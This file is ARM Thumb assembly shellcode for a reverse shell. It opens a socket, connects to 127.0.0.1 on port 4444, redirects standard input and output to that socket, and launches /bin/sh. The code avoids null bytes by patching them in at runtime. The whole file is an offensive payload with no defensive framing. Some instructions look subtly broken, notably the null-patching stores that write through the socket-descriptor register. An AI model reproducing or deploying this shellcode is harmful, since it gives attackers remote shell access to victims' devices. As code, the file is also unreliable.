.section .text                                                                                                                                    
.global _start                                                                                                                                    
_start:                                                                                                                                           
                                                                                                                                                  
.arm                                                                                                                                              
    add   r3, pc, #1 // switch to thumb mode                                                                                                      
    bx    r3                                                                                                                                      
                                                                                                                                                  
.thumb                                                                                                                                            
                                                                                                                                                  
// [281] socket(2, 1, 0)                                                                                                                          
    mov   r0, #2                                                                                                                                  
    mov   r1, #1                                                                                                                                  
    eor   r2, r2                                                                                                                                  
    mov   r7, #200                                                                                                                                
    add   r7, #81                                                                                                                                 
    svc   #1                                                                                                                                      
mov   r10, r0 // save sockfd into r10

// [283] connect(socketfd, &addrstruct, addrlen)                                                                                                  
        // socket fd is in r0 already
        adr   r1, struct
        // r2 == 0 from the previous syscall
        strb  r2, [r0, #1] // replace the 0xff from the protocol with 0x00
        strb  r2, [r0, #5] // replace the 1st 0xff from the IP with 0x00
        strb  r2, [r0, #6] // replace the 2nd 0xff from the IP with 0x00
        mov   r2, #16
        add   r7, #2  // 281 + 2 = 283
        svc   #1

// [063] dup2(sockfd, stdIO)
        mov   r1, #2  // r1 = 2 (stderr)
        mov   r7, #63 // r7 = 63 (dup2)
        loop_stdio:
                mov   r0, r10 // r0 = saved sockfd
                svc   #1
                sub   r1,#1
        bpl   loop_stdio // loop while r3 >= 0

// [011] execve("/bin/sh", 0, 0)
        adr   r0, binsh
        eor   r2, r2
        eor   r1, r1
        strb  r2, [r0, #7]
        mov   r7, #11
        svc   #1

// fix aligment if needed (can't use a nop as it has a null byte)
// nop ==> 00 bf
.byte 0xff, 0xff

struct:
        .ascii "\x02\xff"       // 0xff will be converted to null in runtime
        .ascii "\x11\x5c"       // port 4444
        .byte 127,255,255,1     // IP. both 0xff (255) balues will be converted to 0x00 in runtime
binsh:
        .ascii "/bin/sh+"       // The plus sign will be replace by a null in runtime